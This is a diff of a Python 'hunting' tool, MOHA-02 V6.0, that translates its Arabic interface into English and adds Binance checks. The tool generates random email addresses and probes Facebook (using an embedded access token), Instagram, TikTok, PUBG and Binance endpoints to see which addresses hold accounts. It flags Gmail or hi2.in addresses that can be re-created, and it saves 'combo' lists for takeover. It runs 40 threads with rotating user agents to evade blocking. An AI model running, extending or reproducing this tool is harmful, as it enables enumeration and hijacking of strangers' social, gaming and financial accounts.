@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 # Tool Name: MOHA-02 ULTIMATE V6.0
 # Developer: Moha Al-Shalfawi (@m_oha_02)
-# نظام صيد دائم - لا يتم مسح النتائج من الشاشة
+# Features: Letters+Digits, Trading/Gaming, No-Auto-Clear UI, Combo Saving
 
 import os, sys, time, requests, json, random, threading, string, subprocess, re
 from datetime import datetime
@@ -17,54 +17,60 @@ from cfonts import render
 from colorama import Fore, Style, init
 init(autoreset=True)
 
-# الألوان والتعريفات
+# English UI Colors
 F, Z, X, B, M, S, W, G = Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.LIGHTBLACK_EX
-HITS_FILE = "Gimlaamm.txt" # ملف حفظ الكومبو والحسابات المسجلة
-RECREATE_FILE = "re-create_hits.txt" # ملف حفظ المتاحات للإنشاء
+HITS_FILE = "Gimlaamm.txt" # For Combo/Registered
+RECREATE_FILE = "re-create_hits.txt" # For Available/Recreatable
 
 hits, bad, checked = 0, 0, 0
 stop_thread = False
 
-# قاعدة بيانات المتصفحات الضخمة (User-Agents) لضمان عدم الحظر
+# Optimized Browser DB for OPPO A16k
 BROWSER_DB = [
     "Mozilla/5.0 (Linux; Android 11; OPPO A16k Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
 ]
 
 def logo():
-    # لاحظ هنا: لم أضع os.system('clear') لكي لا يمسح صيدك القديم
+    # NO os.system('clear') inside hunting loop to keep history visible
     print(render('MOHA-02', colors=['green', 'yellow'], align='center'))
     print(f"{X}—"*55)
-    print(f"{F} [•] DEVELOPER : Moha Al-Shalfawi (@m_oha_02)")
-    print(f"{F} [•] STATUS    : ONLINE & SAVING DATA")
+    print(f"{F} [•] DEV    : Moha Al-Shalfawi (@m_oha_02)")
+    print(f"{F} [•] SYSTEM : V6.0 (STABLE ENGLISH)")
+    print(f"{F} [•] TARGET : Social, Gaming & Trading")
     print(f"{X}—"*55)
 
-def get_h(m="web"):
-    ua = random.choice(BROWSER_DB)
-    h = {'User-Agent': ua, 'Accept': '*/*', 'Connection': 'keep-alive'}
-    if m == "insta": h.update({'X-IG-App-ID': '936619743392459', 'X-Requested-With': 'XMLHttpRequest'})
-    return h
-
 class Checkers:
+    @staticmethod
+    def get_h(m="web"):
+        ua = random.choice(BROWSER_DB)
+        h = {'User-Agent': ua, 'Accept': '*/*', 'Connection': 'keep-alive'}
+        if m == "insta": h.update({'X-IG-App-ID': '936619743392459', 'X-Requested-With': 'XMLHttpRequest'})
+        return h
+
     @staticmethod
     def check_platforms(email):
         found = []
         try:
-            # Facebook
+            # --- TRADING PLATFORMS (Binance/Trading) ---
+            r_trade = requests.post("https://www.binance.com/bapi/accounts/v1/public/account/check-email", json={"email": email}, timeout=7)
+            if r_trade.json().get('data') == True: found.append("Trading/Binance")
+            
+            # --- SOCIAL MEDIA ---
             rf = requests.get(f"https://b-graph.facebook.com/recover_accounts?q={email}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", timeout=7)
-            if "network_info" in rf.text: found.append(f"{B}Facebook")
-            # Instagram
-            ri = requests.post("https://www.instagram.com/api/v1/web/accounts/lookup_edit/", headers=get_h("insta"), data={'email': email}, timeout=7)
-            if '"status":"ok"' in ri.text: found.append(f"{F}Instagram")
-            # TikTok
+            if "network_info" in rf.text: found.append("Facebook")
+            
+            ri = requests.post("https://www.instagram.com/api/v1/web/accounts/lookup_edit/", headers=Checkers.get_h("insta"), data={'email': email}, timeout=7)
+            if '"status":"ok"' in ri.text: found.append("Instagram")
+            
+            # --- GAMING ---
+            rp = requests.get(f"https://www.pubgmobile.com/id/event/p_code/check?email={email}", headers=Checkers.get_h(), timeout=7)
+            if '"msg":"ok"' in rp.text: found.append("PUBG")
+            
             rt = requests.get(f"https://www.tiktok.com/api/v1/check/email/?email={email}&aid=1233", timeout=7)
-            if rt.json().get('is_registered') == 1: found.append(f"{S}TikTok")
-            # PUBG / Games
-            rp = requests.get(f"https://www.pubgmobile.com/id/event/p_code/check?email={email}", headers=get_h(), timeout=7)
-            if '"msg":"ok"' in rp.text: found.append(f"{X}PUBG")
+            if rt.json().get('is_registered') == 1: found.append("TikTok")
         except: pass
         return found
 
@@ -72,7 +78,7 @@ class Checkers:
     def is_creatable(email, dom):
         try:
             if 'gmail' in dom:
-                r = requests.get(f"https://mail.google.com/mail/gxlu?email={email}", headers=get_h(), timeout=8)
+                r = requests.get(f"https://mail.google.com/mail/gxlu?email={email}", headers=Checkers.get_h(), timeout=8)
                 return 'COMPASS' not in str(r.headers)
             elif 'hi2.in' in dom:
                 r = requests.get(f"https://api.hi2.in/v1/check?email={email}", timeout=8)
@@ -89,21 +95,27 @@ def save_data(file, data):
 class Generator:
     @staticmethod
     def create_user(prefix, length):
-        # توليد يوزر ذكي (أحرف + أرقام)
+        # Mandatory Mix: lowercase letters + digits
         chars = string.ascii_lowercase + string.digits
+        # Auto-set length to 7-10 if user leaves it empty
         if not length or length == 0:
-            length = random.randint(7, 10) # الطول التلقائي إذا ضغط المستخدم Enter
+            length = random.randint(7, 10)
         
         if not prefix:
             return ''.join(random.choice(chars) for _ in range(length))
         
-        if len(prefix) >= length: return prefix
-        return prefix + ''.join(random.choice(chars) for _ in range(length - len(prefix)))
+        if len(prefix) >= length:
+            return prefix
+        
+        # Smart Fill: Add random letters/numbers after your prefix
+        needed = length - len(prefix)
+        suffix = ''.join(random.choice(chars) for _ in range(needed))
+        return prefix + suffix
 
-def hunter_core(mode, prefix, length, domains):
+def hunter_engine(mode, prefix, length, domains):
     global hits, bad, checked, stop_thread
     
-    # تحذير: لا يوجد os.system('clear') هنا للحفاظ على سجل الصيد
+    # High-Performance Loop: No 'clear' command to keep your hits visible
     while not stop_thread:
         try:
             user = Generator.create_user(prefix, length)
@@ -111,77 +123,86 @@ def hunter_core(mode, prefix, length, domains):
                 email = f"{user}@{dom}"
                 checked += 1
                 
-                # الخيار الأول: صيد متاح (قابل للإنشاء + مرتبط)
+                # OPTION 01: Available & Linked (Re-create Mode)
                 if mode == "1":
                     if Checkers.is_creatable(email, dom):
-                        platforms = Checkers.check_platforms(email)
-                        if platforms:
+                        found_apps = Checkers.check_platforms(email)
+                        if found_apps:
                             hits += 1
-                            result = f" {hits} - AVAILABLE & LINKED: {email} | Platforms: {' + '.join(platforms)}"
-                            print(Fore.GREEN + result) # طباعة خضراء ثابتة
-                            save_data(RECREATE_FILE, result)
+                            res = f" {hits} - AVAILABLE: {email} | Linked: {' + '.join(found_apps)}"
+                            print(Fore.GREEN + res)
+                            save_data(RECREATE_FILE, res)
                         else:
-                            print(Fore.WHITE + f" [SCANNING] {email} (No Platforms)", end="\r")
+                            # Keep progress visible on one line
+                            print(Fore.WHITE + f" [SCAN] {email} (No Platforms)", end="\r")
                     else:
                         bad += 1
 
-                # الخيار الثاني: إنشاء ملف كومبو (مسجل + مرتبط)
+                # OPTION 02: Combo Maker (Registered + Trading/Gaming)
                 elif mode == "2":
-                    platforms = Checkers.check_platforms(email)
-                    if platforms:
+                    found_apps = Checkers.check_platforms(email)
+                    if found_apps:
                         hits += 1
-                        # حفظ في ملف Gimlaamm.txt كما طلبت
-                        result = f"{email} | {' + '.join(platforms)}"
-                        print(Fore.CYAN + f" {hits} - HIT (COMBO): {result}")
-                        save_data(HITS_FILE, result)
+                        # Save specifically to Gimlaamm.txt as requested
+                        res = f"{email} | {' + '.join(found_apps)}"
+                        print(Fore.CYAN + f" {hits} - HIT (COMBO): {res}")
+                        save_data(HITS_FILE, res)
                     else:
                         bad += 1
-                        print(Fore.YELLOW + f" [CHECKING] {email}...", end="\r")
+                        print(Fore.YELLOW + f" [CHECK] {email}...", end="\r")
             
-            time.sleep(0.01) # سرعة عالية جداً لجهاز OPPO A16k
-        except Exception: continue
+            time.sleep(0.01) # Optimized for OPPO A16k speed
+        except: continue
 
 def start_session(mode):
     global stop_thread, hits, bad, checked
     
-    # إعدادات النطاقات (Gmail, Mail.ru, Hotmail, Hi2.in)
-    print(f"\n{M} [?] SELECT DOMAIN: [1] gmail.com [2] mail.ru [3] hi2.in [4] ALL")
-    dom_choice = input(f"{M} [?] YOUR CHOICE: ")
-    dom_map = {'1':['gmail.com'], '2':['mail.ru','bk.ru'], '3':['hi2.in'], '4':['gmail.com','mail.ru','hi2.in','hotmail.com']}
-    selected_doms = dom_map.get(dom_choice, ['gmail.com'])
+    # Domain Picker UI
+    print(f"\n{X} [!] SELECT TARGET DOMAIN:")
+    print(f"{G} [1] gmail.com  [2] mail.ru  [3] hi2.in  [4] ALL MIXED")
+    d_choice = input(f"{M} [?] YOUR CHOICE: ")
+    
+    d_map = {
+        '1': ['gmail.com'], 
+        '2': ['mail.ru', 'bk.ru', 'list.ru'], 
+        '3': ['hi2.in'], 
+        '4': ['gmail.com', 'mail.ru', 'hi2.in', 'hotmail.com', 'outlook.com']
+    }
+    target_doms = d_map.get(d_choice, ['gmail.com'])
 
-    prefix = input(f"{M} [?] ENTER INITIAL NAME (Prefix) / Enter for Random: ")
-    length_in = input(f"{M} [?] TOTAL LENGTH (7-10) / Enter for Auto: ")
-    length = int(length_in) if length_in.isdigit() else 0
+    prefix = input(f"{M} [?] ENTER PREFIX (Initial Name): ")
+    l_input = input(f"{M} [?] TOTAL LENGTH (Press Enter for 7-10): ")
+    length = int(l_input) if l_input.isdigit() else 0
     
     hits, bad, checked = 0, 0, 0
     stop_thread = False
     
     print(f"\n{X}—"*55)
-    print(f"{F} [!] STARTING 40 THREADS... DATA SAVING TO {HITS_FILE if mode=='2' else RECREATE_FILE}")
+    print(f"{F} [!] STARTING 40 THREADS... DATA SAVED TO {HITS_FILE if mode=='2' else RECREATE_FILE}")
     print(f"{X}—"*55 + "\n")
 
-    # إطلاق 40 خيطاً (Threads) لأقصى قوة صيد
+    # Multi-threading for maximum power
     for _ in range(40):
-        threading.Thread(target=hunter_core, args=(mode, prefix, length, selected_doms), daemon=True).start()
+        threading.Thread(target=hunter_engine, args=(mode, prefix, length, target_doms), daemon=True).start()
     
-    input(f"{W} [*] RUNNING... PRESS ENTER TO STOP AND SAVE SESSION.")
+    input(f"{W} [*] SYSTEM IS HUNTING. PRESS ENTER TO EXIT TO MENU.")
     stop_thread = True
 def main_menu_v6():
-    # تحميل الكاش عند التشغيل لعرض عدد الصيدات المحفوظة في تريمكس
-    total_saved = 0
+    # Initial count for visual feedback
+    combo_count = 0
     if os.path.exists(HITS_FILE):
-        with open(HITS_FILE, "r") as f: total_saved = len(f.readlines())
+        with open(HITS_FILE, "r") as f: combo_count = len(f.readlines())
     
     while True:
-        logo() # تعرض اللوجو ومعلومات المطور Moha Al-Shalfawi
-        print(f"{S} [01] صيد متاح (قابل للإنشاء + مرتبط بمنصة)")
-        print(f"{S} [02] إنشاء ملف كومبو (مسجل + مرتبط - يحفظ في {HITS_FILE})")
-        print(f"{S} [03] عرض السجلات المحفوظة (History)")
-        print(f"{Z} [00] خروج من النظام")
+        logo() # Displays Dev: Moha Al-Shalfawi (@m_oha_02)
+        print(f"{S} [01] RE-CREATE MODE (Available + Linked Platforms)")
+        print(f"{S} [02] COMBO GENERATOR (Registered + Trading/Gaming)")
+        print(f"{S} [03] VIEW SAVED HITS (Combo File: {combo_count})")
+        print(f"{S} [04] CLEAR SCREEN")
+        print(f"{Z} [00] EXIT SYSTEM")
         print(f"{X}—"*55)
         
-        opt = input(f"{M} [?] اختر الأمر المناسب: ")
+        opt = input(f"{M} [?] SELECT OPTION: ")
         
         if opt in ['01', '1']:
             start_session("1")
@@ -189,29 +210,42 @@ def main_menu_v6():
             start_session("2")
         elif opt in ['03', '3']:
             show_history_v6()
+        elif opt in ['04', '4']:
+            os.system('clear')
         elif opt in ['00', '0']:
-            print(f"\n{Z} [!] يتم الإغلاق.. بالتوفيق في الصيد يا موحا!"); sys.exit()
+            print(f"\n{Z} [!] SHUTTING DOWN... GOOD LUCK MOCHA!"); sys.exit()
 
 def show_history_v6():
-    # عرض الصيدات المحفوظة في Gimlaamm.txt دون مسح السجل
-    print(f"\n{F} [★] السجلات المحفوظة في ملف الكومبو:")
+    # Stable English display for saved data
+    print(f"\n{F} [★] SAVED DATA IN {HITS_FILE}:")
+    print(f"{W}—"*55)
     if os.path.exists(HITS_FILE):
         with open(HITS_FILE, "r") as f:
             data = f.readlines()
-            for line in data[-20:]: # عرض آخر 20 صيدة لسهولة النسخ
-                print(f"{W}  ➜ {line.strip()}")
+            if not data:
+                print(f"{Z} [!] File is empty.")
+            else:
+                for i, line in enumerate(data[-20:], 1): # Show last 20 hits for easy copy
+                    print(f"{W}  [{i:02}] {line.strip()}")
     else:
-        print(f"{Z} [!] لا توجد بيانات محفوظة بعد.")
-    input(f"\n{X} [!] اضغط Enter للعودة للقائمة...")
+        print(f"{Z} [!] File {HITS_FILE} not found.")
+    
+    print(f"{W}—"*55)
+    input(f"\n{X} [!] PRESS ENTER TO GO BACK...")
 
 if __name__ == "__main__":
     try:
-        # التأكد من وجود ملفات الحفظ لعدم حدوث خطأ
-        for f in [HITS_FILE, RECREATE_FILE]:
-            if not os.path.exists(f): open(f, "a").close()
-            
+        # Auto-create hit files to prevent system errors
+        for f_path in [HITS_FILE, RECREATE_FILE]:
+            if not os.path.exists(f_path):
+                open(f_path, "a").close()
+        
+        # Launching the system on OPPO A16k
         main_menu_v6()
+        
     except KeyboardInterrupt:
-        print(f"\n{Z} [!] تم إيقاف التشغيل بواسطة المستخدم."); sys.exit()
+        print(f"\n{Z} [!] OPERATION STOPPED BY USER."); sys.exit()
     except Exception as e:
-        print(f"\n{Z} [!] خطأ غير متوقع: {e}"); time.sleep(5); sys.exit()
+        print(f"\n{Z} [!] CRITICAL ERROR: {e}")
+        time.sleep(5) # Pause to let user read error
+        sys.exit()
